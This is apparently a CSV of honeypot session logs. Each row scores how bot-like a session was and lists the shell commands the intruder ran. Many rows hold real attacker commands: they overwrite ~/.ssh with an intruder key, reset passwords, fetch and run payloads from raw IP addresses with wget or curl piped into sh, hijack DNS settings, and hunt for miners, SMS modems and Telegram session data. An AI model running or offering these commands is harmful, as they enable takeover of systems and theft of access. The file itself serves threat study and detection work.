255416ee4f5e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.111013705550021e-75,9,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget; echo -e '\x67\x61\x79\x66\x67\x74';,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-164.74822172880383
97fde58b277f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5717211018999828e-60,9,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i; ./.i scan.ssh.x86_64; >.i;,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-135.79819940083456
93b89db2e601,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.761794097355694e-42,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-93.16644947495207
20343e3cfd52,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.4454298469246396e-06,2.6689702430777455e-09,17,19,cd ~; chattr -ia .ssh; lockr -ia .ssh,df -h | head -n 2 | awk 'FNR == 2 {print $2; }',"cd ~; chattr -ia .ssh; lockr -ia .ssh | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1... | cat /proc/cpuinfo | grep name | wc -l | echo -e ""admin\nxaZmO9pO0RUg\nxaZmO9pO0RUg"" | passwd | bash | echo ""admin\nxaZmO9pO0RUg\nxaZmO9pO0RUg\n"" | passwd | cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }' | free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | ls -lh $(which ls)",-16.624885649437722
00ba26db5d38,False_False_False,non_human_like,non_human_like,bot_posterior_high,6.450041386218963e-06,8.022636899119286e-09,15,16,cat /proc/cpuinfo | grep name | wc -l,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1...","cat /proc/cpuinfo | grep name | wc -l | echo -e ""admin\nNI39NXBRbmIW\nNI39NXBRbmIW"" | passwd | bash | echo ""admin\nNI39NXBRbmIW\nNI39NXBRbmIW\n"" | passwd | cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }' | free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | ls -lh $(which ls) | which ls | crontab -l",-15.032640244266592
fa5ee5f2cd67,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0166657304685942e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-81.07222968227944
72fbaf54c740,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.348333771948995e-71,11,15,sh,wget http://95.214.27.202/x86_64 -O-> .i || busybox wget http://95.214.27.202/x86_64 -O-> .i || wd1 http://95.214.27.202...,"sh | shell | enable | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | mkdir /home/; mount -o remount, rw /home/; cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .... | mkdir /tmp/; mount -o remount, rw /tmp/; cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; ch... | mkdir /var/tmp/; mount -o remount, rw /var/tmp/; cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp... | mkdir /home/$USER/; mount -o remount, rw /home/$USER/; cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/...",-154.38565656544165
ed2a69039026,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.19084508341132e-50,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-100.89307643539443
fe9ba131d580,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.6174804453627644e-49,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-107.16716106550471
4149c1f820b9,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.5742514534285e-54,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-109.7173113539426
a8d2b1d612d9,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0545368015218005e-52,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-105.54529836427056
94ce1100acec,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.0674128247956104e-10,5.205149913301527e-16,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-26.593473127424012
d37377a43802,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.956667685885334e-40,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.22932644831245
ef902ac91105,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.5114073106441454e-43,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-95.12587890084828
6c7acda2c27d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.6025113580647202e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-118.79275423871364
cbf7fe6bd036,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0471616371797168e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.25816736688358
7bfcc235d77d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.675792848400904e-32,5,6,wget -qO - http://119.18.194.146/x/1sh | sh > /dev/null 2>&1 &,cd /var/run; rm -rf tsh; tftp -g 127.0.0.1 -r tsh; sh tsh &,wget -qO - http://119.18.194.146/x/1sh | sh > /dev/null 2>&1 & | rm -rf /var/run/1sh; wget -c http://119.18.194.146/x/1sh -P /var/run && sh /var/run/1sh & | wget -qO - http://119.18.194.146/x/2sh | sh > /dev/null 2>&1 & | rm -rf /tmp/2sh; wget -c http://119.18.194.146/x/2sh -P /tmp && sh /tmp/2sh & | curl http://119.18.194.146/x/3sh | sh | cd /var/run; rm -rf tsh; tftp -g 127.0.0.1 -r tsh; sh tsh &,-69.69823442205248
f4ca34a23fc6,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.26258438951489e-20,4,5,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-47.616643248027735
d1cd08d3c868,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.369808194270478e-37,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.88458013402851
8a36a8c853c8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.2174269209948114e-47,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-95.14167830720416
a24a67f422b0,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.274519371673692e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-117.56157791859032
f40408cc2fb5,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3839736328741594e-99,9,12,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://171.22.136.15/x86_64 -O-> .i; ./.i scan.ssh.x86_64; >.i;,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-221.35688988903547
ba3097ec5f4e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0108517969316842e-48,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-97.28456966777884
67902177aa12,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.689595336315236e-40,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.67310763016135
2cc75b863a14,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.574983207839131e-38,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-81.12945382750654
e27cd0c5827d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5435821310407922e-51,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-102.8065566157304
ba0a3205a984,False_False_False,non_human_like,non_human_like,bot_posterior_high,4.988461865806926e-10,4.042993692730301e-15,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-24.991014687773628
4cef7fb5a390,False_False_False,non_human_like,non_human_like,bot_posterior_high,9.050538096744276e-13,2.931527692293729e-18,6,8,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va... | locate D877F783D5D3EF8Cs | echo Hi | cat -n,-31.530001676596292
9291b8eae963,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.9277801577288756e-11,4.371434794114025e-17,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-28.3679755658815
205e7cae7fc2,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.05929510174847e-79,8,10,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget; curl; echo -e '\x67\x61\x79\x66\x67\x74';,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-172.7012724745814
6f1fbd392aa2,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.3023559312873974e-101,8,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget; echo -e '\x67\x61\x79\x66\x67\x74';,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-226.9080589678333
